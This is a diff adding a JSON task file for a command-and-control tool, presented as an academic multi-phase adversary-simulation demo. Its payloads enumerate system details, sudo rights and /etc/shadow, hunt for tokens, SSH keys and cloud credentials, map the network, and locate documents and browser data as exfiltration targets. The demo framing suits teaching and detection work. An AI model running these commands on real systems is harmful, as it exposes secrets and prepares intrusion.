@@ -1,0 +1,117 @@
+{
+  "id": "demo_orchestrator_2026",
+  "name": "2026 Comprehensive Demonstration Suite",
+  "description": "Multi-stage adversary simulation for academic presentation demonstrating reconnaissance, privilege escalation, lateral movement, and exfiltration in a controlled VM environment",
+  "version": "3.0",
+  "author": "SecureComm C2 - Academic Demo",
+  "category": "demonstration",
+  "platform": "cross-platform",
+  "risk_level": "medium",
+  "requires_admin": false,
+  "demo_phases": [
+    {
+      "phase": 1,
+      "name": "Initial Reconnaissance",
+      "description": "System discovery and environment mapping",
+      "estimated_time": "2 minutes",
+      "commands": [
+        {
+          "type": "exec",
+          "payload": "echo '=== PHASE 1: INITIAL RECONNAISSANCE ==='; whoami; hostname; uname -a 2>/dev/null || systeminfo | head -10; echo '--- Network Interfaces ---'; ip addr 2>/dev/null || ipconfig /all 2>/dev/null | head -20",
+          "description": "System identification and basic enumeration",
+          "demo_note": "Shows attacker gathering baseline system information"
+        }
+      ]
+    },
+    {
+      "phase": 2,
+      "name": "Privilege Discovery",
+      "description": "Checking current privileges and escalation vectors",
+      "estimated_time": "3 minutes",
+      "commands": [
+        {
+          "type": "exec",
+          "payload": "echo '=== PHASE 2: PRIVILEGE DISCOVERY ==='; id 2>/dev/null || whoami /all 2>/dev/null; echo '--- Sudo Rights ---'; sudo -l 2>/dev/null || echo 'No sudo access'; echo '--- Running as Admin ---'; net session 2>/dev/null && echo 'ADMIN PRIVILEGES' || echo 'Standard user'; echo '--- Interesting Files ---'; ls -la /etc/passwd /etc/shadow 2>/dev/null | head -5",
+          "description": "Privilege enumeration and escalation opportunity identification",
+          "demo_note": "Demonstrates privilege detection in both Linux and Windows contexts"
+        }
+      ]
+    },
+    {
+      "phase": 3,
+      "name": "Credential & Token Discovery",
+      "description": "Hunting for credentials and access tokens",
+      "estimated_time": "3 minutes",
+      "commands": [
+        {
+          "type": "exec",
+          "payload": "echo '=== PHASE 3: CREDENTIAL DISCOVERY ==='; env | grep -E 'KEY|TOKEN|SECRET|PWD|PASS' | head -10; echo '--- SSH Keys ---'; ls -la ~/.ssh/ 2>/dev/null | head -5; echo '--- Cloud Credentials ---'; ls -la ~/.aws/ ~/.azure/ ~/.config/gcloud/ 2>/dev/null | head -10; cat ~/.gitconfig 2>/dev/null | grep -E 'token|password' | head -5",
+          "description": "Environment variable and credential file enumeration",
+          "demo_note": "Shows how attackers discover credentials in environment and config files"
+        }
+      ]
+    },
+    {
+      "phase": 4,
+      "name": "Network Discovery",
+      "description": "Internal network mapping and connection analysis",
+      "estimated_time": "2 minutes",
+      "commands": [
+        {
+          "type": "exec",
+          "payload": "echo '=== PHASE 4: NETWORK DISCOVERY ==='; netstat -tunap 2>/dev/null | head -15 || netstat -ano 2>/dev/null | head -15; echo '--- ARP Table ---'; arp -a 2>/dev/null | head -10; echo '--- Active Connections ---'; ss -tuln 2>/dev/null | head -10 || netstat -an | findstr 'LISTENING' 2>/dev/null | head -10",
+          "description": "Network connection and topology discovery",
+          "demo_note": "Demonstrates network reconnaissance for lateral movement planning"
+        }
+      ]
+    },
+    {
+      "phase": 5,
+      "name": "Persistence Check",
+      "description": "Evaluating persistence mechanisms already in place",
+      "estimated_time": "2 minutes",
+      "commands": [
+        {
+          "type": "exec",
+          "payload": "echo '=== PHASE 5: PERSISTENCE ENUMERATION ==='; crontab -l 2>/dev/null || echo 'No user crontab'; echo '--- System Cron ---'; ls -la /etc/cron.d/ 2>/dev/null | head -5; echo '--- Startup Items ---'; reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' 2>/dev/null | head -10 || ls -la /etc/init.d/ 2>/dev/null | head -5; echo '--- Scheduled Tasks ---'; schtasks /query /fo LIST 2>/dev/null | head -15 || systemctl list-timers --all 2>/dev/null | head -10",
+          "description": "Persistence mechanism enumeration",
+          "demo_note": "Shows existing persistence for operational security assessment"
+        }
+      ]
+    },
+    {
+      "phase": 6,
+      "name": "Data Discovery",
+      "description": "Sensitive data location and classification",
+      "estimated_time": "2 minutes",
+      "commands": [
+        {
+          "type": "exec",
+          "payload": "echo '=== PHASE 6: DATA DISCOVERY ==='; find /home -maxdepth 2 -name '*.txt' -o -name '*.pdf' -o -name '*.doc*' 2>/dev/null | head -15; echo '--- Database Files ---'; find / -name '*.db' -o -name '*.sqlite' -o -name '*.sql' 2>/dev/null | head -10; echo '--- Log Files ---'; ls -la /var/log/ 2>/dev/null | head -10 || dir C:\\Windows\\Logs 2>/dev/null | head -10; echo '--- Browser Data ---'; ls -la ~/.mozilla/firefox/*/ 2>/dev/null | head -5",
+          "description": "Sensitive file and data enumeration",
+          "demo_note": "Demonstrates data discovery for exfiltration target selection"
+        }
+      ]
+    }
+  ],
+  "presentation_flow": {
+    "total_duration": "15 minutes",
+    "narrative": "Complete adversary simulation from initial access to data discovery",
+    "audience_engagement": [
+      "Explain each technique's real-world impact",
+      "Show detection opportunities at each phase",
+      "Discuss mitigation strategies",
+      "Demonstrate SecureComm C2 command orchestration"
+    ]
+  },
+  "demo_environment_requirements": {
+    "vm_recommendation": "Ubuntu 22.04 or Windows 10/11 VM",
+    "network": "Isolated lab network preferred",
+    "preparation": "Pre-populate some fake credentials and documents for realistic discovery"
+  },
+  "mitre_techniques": ["T1082", "T1083", "T1087", "T1049", "T1518", "T1552", "T1071"],
+  "tags": ["demonstration", "academic", "multi-phase", "comprehensive", "2026"],
+  "created_at": "2026-02-11T12:00:00Z",
+  "updated_at": "2026-02-11T12:00:00Z",
+  "audit_note": "Purpose-built for academic presentation - demonstrates full kill chain in controlled environment"
+}
